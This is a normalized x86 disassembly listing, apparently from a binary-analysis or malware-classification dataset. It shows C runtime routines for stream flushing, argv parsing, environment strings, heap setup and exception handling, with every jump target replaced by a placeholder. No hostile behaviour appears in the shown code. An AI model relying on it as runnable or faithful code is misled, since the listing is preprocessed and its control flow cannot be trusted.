lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_423da5
add esp 0x10
mov eax [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je rwxdata
lea ecx [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_423dd6
add esp 0x10
mov eax edi
dec edi
test eax eax
jne rwxdata
mov ax [ ebx ]
inc ebx
push eax
lea eax [ ebp - 0x44 ]
push eax
inc ebx
call sub_426952
pop ecx
test eax eax
pop ecx
jle rwxdata
jmp rwxdata
sub_423d70
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
dec [ ecx + 0x4 ]
js rwxdata
push ecx
push [ ebp + 0x8 ]
call sub_4234bd
pop ecx
pop ecx
mov edx [ ecx ]
mov al [ ebp + 0x8 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp rwxdata
inc [ eax ]
pop ebp
retn
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
mov eax [ ebp + 0x10 ]
jne rwxdata
sub_423da5
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle rwxdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg rwxdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_423d70
add esp 0xc
cmp [ esi ] 0xffffffff
je rwxdata
sub_423dd6
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle rwxdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg rwxdata
movsx eax [ esi ]
push edi
inc esi
push [ esp + 0x1c ]
push eax
call sub_423d70
add esp 0xc
cmp [ edi ] 0xffffffff
je rwxdata
sub_423e39
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je rwxdata
pop esi
leave
retn
mov eax [ rwxdata ]
cmp eax 0x3
jne rwxdata
cmp eax 0x2
jne rwxdata
push esi
call sub_424e7c
pop ecx
test eax eax
push esi
je rwxdata
push esi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
call sub_425bd7
add esp 0xc
test eax eax
je rwxdata
push 0x0
push [ rwxdata ]
call [ HeapFree@IAT ]
push eax
call sub_424ea7
pop ecx
pop ecx
jmp rwxdata
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call sub_425c2e
add esp 0xc
jmp rwxdata
sub_423ea2
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
cmp edi [ rwxdata ]
jae rwxdata
and [ rwxdata ] 0x0
mov [ rwxdata ] 0x9
mov eax edi
mov esi edi
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rwxdata ]
shl esi 0x3
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je rwxdata
push edi
call sub_426b1f
cmp eax 0xffffffff
pop ecx
je rwxdata
xor ebp ebp
cmp edi 0x1
je rwxdata
xor eax eax
jmp rwxdata
push ebp
call sub_42658d
pop ecx
jmp rwxdata
push 0x2
call sub_426b1f
push 0x1
mov ebp eax
call sub_426b1f
pop ecx
cmp eax ebp
pop ecx
je rwxdata
cmp edi 0x2
jne rwxdata
pop edi
pop esi
pop ebp
pop ebx
retn
or eax 0xffffffff
push edi
call sub_426b1f
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne rwxdata
call [ GetLastError@IAT ]
mov ebp eax
jmp rwxdata
push edi
call sub_426aa5
mov eax [ ebx ]
pop ecx
and [ eax + esi + 0x4 ] 0x0
test ebp ebp
je rwxdata
sub_423f55
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je rwxdata
pop esi
retn
test al 0x8
je rwxdata
push [ esi + 0x8 ]
call sub_423e39
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_423f80
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne rwxdata
push esi
call sub_423fbb
test eax eax
pop ecx
je rwxdata
push esi
call sub_424020
pop ecx
pop esi
retn
test [ esi + 0xd ] 0x40
je rwxdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_426b5c
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_423fbb
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne rwxdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je rwxdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle rwxdata
push edi
push eax
push [ esi + 0x10 ]
call sub_42673b
add esp 0xc
cmp eax edi
jne rwxdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je rwxdata
and al 0xfd
mov [ esi + 0xc ] eax
jmp rwxdata
sub_424020
push ebx
push esi
push edi
xor esi esi
xor ebx ebx
xor edi edi
cmp [ rwxdata ] esi
jle rwxdata
cmp [ esp + 0x10 ] 0x1
mov eax ebx
je rwxdata
mov eax [ rwxdata ]
mov eax [ eax + esi * 4 ]
test eax eax
je rwxdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rwxdata ]
jl rwxdata
mov ecx [ eax + 0xc ]
test cl 0x83
je rwxdata
cmp [ esp + 0x10 ] 0x1
jne rwxdata
cmp [ esp + 0x10 ] 0x0
jne rwxdata
push eax
call sub_423f80
cmp eax 0xffffffff
pop ecx
je rwxdata
test cl 0x2
je rwxdata
inc ebx
jmp rwxdata
push eax
call sub_423f80
cmp eax 0xffffffff
pop ecx
jne rwxdata
or edi eax
sub_42408d
mov eax [ rwxdata ]
push esi
push 0x14
test eax eax
pop esi
jne rwxdata
cmp eax esi
jge rwxdata
mov eax 0x200
jmp rwxdata
push 0x4
push eax
call sub_426bb3
pop ecx
mov [ rwxdata ] eax
test eax eax
pop ecx
jne rwxdata
mov eax esi
mov [ rwxdata ] eax
xor ecx ecx
mov eax rwxdata
push 0x4
push esi
mov [ rwxdata ] esi
call sub_426bb3
pop ecx
mov [ rwxdata ] eax
test eax eax
pop ecx
jne rwxdata
mov edx [ rwxdata ]
mov [ ecx + edx ] eax
add eax 0x20
add ecx 0x4
cmp eax rwxdata
jl rwxdata
xor edx edx
mov ecx rwxdata
push 0x1a
call sub_422c01
pop ecx
or [ ecx ] 0xffffffff
test eax eax
jne rwxdata
mov eax edx
mov esi edx
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rwxdata ]
mov eax [ eax + esi * 8 ]
cmp eax 0xffffffff
je rwxdata
pop esi
retn
add ecx 0x20
inc edx
cmp ecx rwxdata
jl rwxdata
sub_424146
push ebp
mov ebp esp
push ebx
push [ ebp + 0x8 ]
call sub_424287
test eax eax
pop ecx
je rwxdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ eax + 0x8 ]
test ebx ebx
je rwxdata
cmp ebx 0x5
jne rwxdata
cmp ebx 0x1
je rwxdata
and [ eax + 0x8 ] 0x0
push 0x1
pop eax
jmp rwxdata
or eax 0xffffffff
jmp rwxdata
mov ecx [ rwxdata ]
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ rwxdata ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne rwxdata
pop ebx
pop ebp
retn
and [ eax + 0x8 ] 0x0
push ecx
call ebx
pop ecx
mov ecx [ rwxdata ]
mov edx [ rwxdata ]
add edx ecx
push esi
cmp ecx edx
jge rwxdata
mov eax [ eax ]
mov esi [ rwxdata ]
cmp eax 0xc000008e
jne rwxdata
lea esi [ ecx + ecx * 2 ]
sub edx ecx
lea esi [ esi * 4 + rwxdata ]
cmp eax 0xc0000090
jne rwxdata
mov [ rwxdata ] 0x83
jmp rwxdata
and [ esi ] 0x0
add esi 0xc
dec edx
jne rwxdata
cmp eax 0xc0000091
jne rwxdata
mov [ rwxdata ] 0x81
jmp rwxdata
push [ rwxdata ]
push 0x8
call ebx
pop ecx
mov [ rwxdata ] esi
pop ecx
pop esi
jmp rwxdata
cmp eax 0xc0000093
jne rwxdata
mov [ rwxdata ] 0x84
jmp rwxdata
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
cmp eax 0xc000008d
jne rwxdata
mov [ rwxdata ] 0x85
jmp rwxdata
cmp eax 0xc000008f
jne rwxdata
mov [ rwxdata ] 0x82
jmp rwxdata
cmp eax 0xc0000092
jne rwxdata
mov [ rwxdata ] 0x86
jmp rwxdata
mov [ rwxdata ] 0x8a
sub_424287
mov edx [ esp + 0x4 ]
mov ecx [ rwxdata ]
cmp [ rwxdata ] edx
push esi
mov eax rwxdata
je rwxdata
lea ecx [ ecx + ecx * 2 ]
pop esi
lea ecx [ ecx * 4 + rwxdata ]
cmp eax ecx
jae rwxdata
lea esi [ ecx + ecx * 2 ]
lea esi [ esi * 4 + rwxdata ]
xor eax eax
cmp [ eax ] edx
je rwxdata
cmp [ eax ] edx
jne rwxdata
retn
add eax 0xc
cmp eax esi
jae rwxdata
sub_4242ca
cmp [ rwxdata ] 0x0
jne rwxdata
push esi
mov esi [ rwxdata ]
mov al [ esi ]
cmp al 0x22
jne rwxdata
call sub_4270c2
cmp al 0x20
jbe rwxdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x22
je rwxdata
mov al [ esi ]
test al al
je rwxdata
inc esi
cmp [ esi ] 0x20
ja rwxdata
cmp [ esi ] 0x22
jne rwxdata
test al al
je rwxdata
mov eax esi
pop esi
retn
cmp al 0x20
jbe rwxdata
inc esi
jmp rwxdata
movzx eax al
push eax
call sub_426cbc
test eax eax
pop ecx
je rwxdata
inc esi
jmp rwxdata
sub_424322
push ebx
xor ebx ebx
cmp [ rwxdata ] ebx
push esi
push edi
jne rwxdata
mov esi [ rwxdata ]
xor edi edi
call sub_4270c2
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_42304d
mov esi eax
pop ecx
cmp esi ebx
mov [ rwxdata ] esi
jne rwxdata
cmp al 0x3d
je rwxdata
mov edi [ rwxdata ]
cmp [ edi ] bl
je rwxdata
push 0x9
call sub_422c01
pop ecx
push esi
call sub_4224c0
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp rwxdata
inc edi
push [ rwxdata ]
call sub_423e39
pop ecx
mov [ rwxdata ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rwxdata ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je rwxdata
add edi ebp
cmp [ edi ] bl
jne rwxdata
push ebp
call sub_42304d
cmp eax ebx
pop ecx
mov [ esi ] eax
jne rwxdata
push edi
call sub_4224c0
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je rwxdata
pop ebp
push edi
push [ esi ]
call sub_422540
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_422c01
pop ecx
sub_4243db
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rwxdata ] ebx
push esi
push edi
jne rwxdata
mov esi rwxdata
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rwxdata ]
mov [ rwxdata ] esi
mov edi esi
cmp [ eax ] bl
je rwxdata
call sub_4270c2
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_424474
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_42304d
mov esi eax
add esp 0x18
cmp esi ebx
jne rwxdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_424474
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rwxdata ] esi
pop edi
pop esi
mov [ rwxdata ] eax
pop ebx
leave
retn
push 0x8
call sub_422c01
pop ecx
sub_424474
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je rwxdata
cmp [ eax ] 0x22
jne rwxdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je rwxdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je rwxdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rwxdata ] 0x4
je rwxdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je rwxdata
test dl dl
je rwxdata
cmp dl 0x20
je rwxdata
inc [ ecx ]
test esi esi
je rwxdata
cmp [ eax ] 0x22
jne rwxdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rwxdata ] 0x4
je rwxdata
test dl dl
jne rwxdata
test dl dl
je rwxdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp rwxdata
inc [ ecx ]
test esi esi
je rwxdata
inc [ ecx ]
test esi esi
je rwxdata
test esi esi
je rwxdata
dec eax
jmp rwxdata
cmp dl 0x9
jne rwxdata
test edi edi
je rwxdata
mov dl [ eax ]
cmp dl 0x20
je rwxdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp rwxdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp rwxdata
cmp dl 0x9
jne rwxdata
cmp [ eax ] 0x0
je rwxdata
test edi edi
je rwxdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne rwxdata
inc eax
inc ebx
jmp rwxdata
mov edx ebx
dec ebx
test edx edx
je rwxdata
test bl 0x1
jne rwxdata
cmp [ eax ] 0x5c
jne rwxdata
mov dl [ eax ]
test dl dl
je rwxdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je rwxdata
test esi esi
je rwxdata
cmp [ ebp + 0x18 ] 0x0
jne rwxdata
inc [ ecx ]
dec ebx
jne rwxdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne rwxdata
inc [ ecx ]
jmp rwxdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je rwxdata
cmp dl 0x20
je rwxdata
test esi esi
je rwxdata
mov eax edx
jmp rwxdata
cmp [ eax ] 0x0
je rwxdata
inc eax
jmp rwxdata
test esi esi
je rwxdata
cmp dl 0x9
je rwxdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rwxdata ] 0x4
je rwxdata
movzx ebx dl
test [ ebx + rwxdata ] 0x4
je rwxdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp rwxdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_424628
push ecx
push ecx
mov eax [ rwxdata ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne rwxdata
cmp eax 0x1
jne rwxdata
call ebp
mov esi eax
cmp esi ebx
je rwxdata
cmp eax 0x2
jne rwxdata
cmp esi ebx
jne rwxdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je rwxdata
mov [ rwxdata ] 0x1
jmp rwxdata
xor eax eax
cmp edi ebx
jne rwxdata
cmp [ esi ] bx
mov eax esi
je rwxdata
call ebp
mov esi eax
cmp esi ebx
je rwxdata
mov [ rwxdata ] 0x2
jmp rwxdata
cmp [ edi ] bl
mov eax edi
je rwxdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je rwxdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je rwxdata
inc eax
inc eax
cmp [ eax ] bx
jne rwxdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_42304d
mov esi eax
pop ecx
cmp esi ebx
jne rwxdata
inc eax
cmp [ eax ] bl
jne rwxdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp rwxdata
push ebp
call sub_42304d
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je rwxdata
inc eax
inc eax
cmp [ eax ] bx
jne rwxdata
push ebp
push edi
push esi
call sub_422780
add esp 0xc
xor esi esi
jmp rwxdata
inc eax
cmp [ eax ] bl
jne rwxdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne rwxdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp rwxdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_423e39
pop ecx
mov [ esp + 0x10 ] ebx
sub_42475a
sub esp 0x44
push ebx
push ebp
push esi
push edi
push 0x100
call sub_42304d
mov esi eax
pop ecx
test esi esi
jne rwxdata
mov [ rwxdata ] esi
mov [ rwxdata ] 0x20
lea eax [ esi + 0x100 ]
push 0x1b
call sub_422c01
pop ecx
lea eax [ esp + 0x10 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ esp + 0x42 ] 0x0
je rwxdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
mov [ esi + 0x5 ] 0xa
mov eax [ rwxdata ]
add esi 0x8
add eax 0x100
jmp rwxdata
xor ebx ebx
mov eax [ esp + 0x44 ]
test eax eax
je rwxdata
cmp esi eax
jae rwxdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne rwxdata
mov esi [ eax ]
lea ebp [ eax + 0x4 ]
mov eax 0x800
cmp esi eax
lea ebx [ esi + ebp ]
jl rwxdata
mov eax [ rwxdata ]
cmp [ eax + ebx * 8 ] 0xffffffff
lea esi [ eax + ebx * 8 ]
jne rwxdata
push [ rwxdata ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp rwxdata
cmp [ rwxdata ] esi
jge rwxdata
mov esi eax
or [ esi + 0x4 ] 0x40
jmp rwxdata
push edi
call [ GetFileType@IAT ]
test eax eax
je rwxdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je rwxdata
xor edi edi
test esi esi
jle rwxdata
mov edi rwxdata
inc ebx
cmp ebx 0x3
jl rwxdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne rwxdata
mov eax [ ebx ]
cmp eax 0xffffffff
je rwxdata
mov esi [ rwxdata ]
add [ rwxdata ] 0x20
mov [ edi ] eax
lea ecx [ eax + 0x100 ]
cmp eax 0x3
jne rwxdata
inc edi
inc ebp
add ebx 0x4
cmp edi esi
jl rwxdata
mov cl [ ebp ]
test cl 0x1
je rwxdata
add edi 0x4
cmp [ rwxdata ] esi
jl rwxdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov ecx [ edi ]
add eax 0x8
add ecx 0x100
jmp rwxdata
or [ esi + 0x4 ] 0x8
jmp rwxdata
test cl 0x8
jne rwxdata
push 0x100
call sub_42304d
test eax eax
pop ecx
je rwxdata
jmp rwxdata
cmp eax ecx
jae rwxdata
mov eax edi
mov ecx edi
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rwxdata ]
lea eax [ eax + ecx * 8 ]
mov ecx [ ebx ]
mov [ eax ] ecx
mov cl [ ebp ]
mov [ eax + 0x4 ] cl
push eax
call [ GetFileType@IAT ]
test eax eax
je rwxdata
sub_424905
push esi
mov esi [ esp + 0x8 ]
push 0x0
and [ esi ] 0x0
call [ GetModuleHandleA@IAT ]
cmp [ eax ] 0x5a4d
jne rwxdata
pop esi
retn
mov ecx [ eax + 0x3c ]
test ecx ecx
je rwxdata
add eax ecx
mov cl [ eax + 0x1a ]
mov [ esi ] cl
mov al [ eax + 0x1b ]
mov [ esi + 0x1 ] al
sub_424932
push ebp
mov ebp esp
mov eax 0x122c
call sub_427490
lea eax [ ebp - 0x98 ]
push ebx
push eax
mov [ ebp - 0x98 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
je rwxdata
lea eax [ ebp - 0x122c ]
push 0x1090
push eax
push rwxdata
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je rwxdata
cmp [ ebp - 0x88 ] 0x2
jne rwxdata
lea eax [ ebp - 0x4 ]
push eax
call sub_424905
cmp [ ebp - 0x4 ] 0x6
pop ecx
sbb eax eax
add eax 0x3
xor ebx ebx
lea ecx [ ebp - 0x122c ]
cmp [ ebp - 0x122c ] bl
je rwxdata
cmp [ ebp - 0x94 ] 0x5
jb rwxdata
lea eax [ ebp - 0x122c ]
push 0x16
push eax
push rwxdata
call sub_427450
add esp 0xc
test eax eax
jne rwxdata
mov al [ ecx ]
cmp al 0x61
jl rwxdata
push 0x1
pop eax
jmp rwxdata
lea eax [ ebp - 0x19c ]
push 0x104
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
cmp [ ebp - 0x19c ] bl
lea ecx [ ebp - 0x19c ]
je rwxdata
lea eax [ ebp - 0x122c ]
jmp rwxdata
inc ecx
cmp [ ecx ] bl
jne rwxdata
cmp al 0x7a
jg rwxdata
pop ebx
leave
retn
lea eax [ ebp - 0x19c ]
push eax
lea eax [ ebp - 0x122c ]
push eax
call sub_4273d0
pop ecx
pop ecx
mov al [ ecx ]
cmp al 0x61
jl rwxdata
cmp eax ebx
je rwxdata
sub al 0x20
mov [ ecx ] al
push 0x2c
push eax
call sub_427310
pop ecx
cmp eax ebx
pop ecx
je rwxdata
inc ecx
cmp [ ecx ] bl
jne rwxdata
cmp al 0x7a
jg rwxdata
inc eax
mov ecx eax
cmp [ eax ] bl
je rwxdata
sub al 0x20
mov [ ecx ] al
push 0xa
push ebx
push eax
call sub_4270de
add esp 0xc
cmp eax 0x2
je rwxdata
cmp [ ecx ] 0x3b
jne rwxdata
cmp eax 0x3
je rwxdata
inc ecx
mov [ ecx ] bl
jmp rwxdata
cmp eax 0x1
je rwxdata
cmp [ ecx ] bl
jne rwxdata
sub_424a7a
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rwxdata ] eax
je rwxdata
xor eax eax
retn
call sub_424932
cmp eax 0x3
mov [ rwxdata ] eax
jne rwxdata
cmp eax 0x2
jne rwxdata
push 0x3f8
call sub_424e34
pop ecx
jmp rwxdata
push 0x1
pop eax
retn
call sub_42597b
test eax eax
jne rwxdata
push [ rwxdata ]
call [ HeapDestroy@IAT ]
sub_424ad8
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push rwxdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424b1a
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_424af8
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je rwxdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne rwxdata
jmp rwxdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_424bae
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je rwxdata
sub_424bc8
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne rwxdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_424b1a
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp rwxdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je rwxdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp rwxdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je rwxdata
cmp esi 0xffffffff
je rwxdata
js rwxdata
mov eax 0x0
jmp rwxdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_424ad8
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_424b1a
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_424bae
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_424ca8
mov eax [ rwxdata ]
cmp eax 0x1
je rwxdata
push 0xfc
call sub_424ce1
mov eax [ rwxdata ]
pop ecx
test eax eax
je rwxdata
test eax eax
jne rwxdata
push 0xff
call sub_424ce1
pop ecx
call eax
retn
cmp [ rwxdata ] 0x1
jne rwxdata
sub_424ce1
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rwxdata
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rwxdata ]
jne rwxdata
add eax 0x8
inc ecx
cmp eax rwxdata
jb rwxdata
pop esi
leave
retn
mov eax [ rwxdata ]
cmp eax 0x1
je rwxdata
cmp edx [ eax ]
je rwxdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rwxdata ]
push 0x0
push eax
push [ esi ]
call sub_4224c0
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne rwxdata
cmp edx 0xfc
je rwxdata
cmp [ rwxdata ] 0x1
je rwxdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne rwxdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_4224c0
inc eax
pop ecx
cmp eax 0x3c
jbe rwxdata
lea eax [ ebp - 0x1a4 ]
push rwxdata
push eax
call sub_422540
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push rwxdata
push eax
call sub_422540
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_422550
lea eax [ ebp - 0xa0 ]
push rwxdata
push eax
call sub_422550
push [ esi + rwxdata ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_422550
push 0x12010
lea eax [ ebp - 0xa0 ]
push rwxdata
push eax
call sub_4274bf
add esp 0x2c
pop edi
jmp rwxdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_4224c0
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push rwxdata
push edi
call sub_427550
add esp 0x10
sub_424e34
push 0x140
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rwxdata ] eax
jne rwxdata
mov ecx [ esp + 0x4 ]
and [ rwxdata ] 0x0
and [ rwxdata ] 0x0
push 0x1
mov [ rwxdata ] eax
mov [ rwxdata ] ecx
mov [ rwxdata ] 0x10
pop eax
retn
retn
sub_424e7c
mov eax [ rwxdata ]
lea ecx [ eax + eax * 4 ]
mov eax [ rwxdata ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb rwxdata
retn
add eax 0x14
jmp rwxdata
cmp eax ecx
